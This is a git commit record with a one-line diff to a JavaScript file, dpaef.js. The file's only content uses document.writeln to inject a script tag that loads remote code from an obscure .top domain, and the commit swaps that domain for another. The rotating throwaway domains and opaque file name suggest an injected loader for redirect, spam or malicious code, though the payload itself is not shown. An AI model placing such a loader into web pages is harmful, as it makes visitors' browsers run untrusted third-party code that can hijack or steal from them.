8ecd4c6541aec19106012e69804a6ca3cabe0858
xzsfaf15618a <92630434+xzsfaf15618a@users.noreply.github.com>
2022-01-10 16:56:53 +0800

    Update dpaef.js

--- dpaef.js
+++ dpaef.js
@@ -1,1 +1,1 @@
-document.writeln('<script src="https://um.zixixtx.top/c/EA313724-83BA-4C23-8B74-2D8CFCC108C1.ap"></script>');
+document.writeln('<script src="https://az.jzcool.top/c/EA313724-83BA-4C23-8B74-2D8CFCC108C1.ap"></script>');
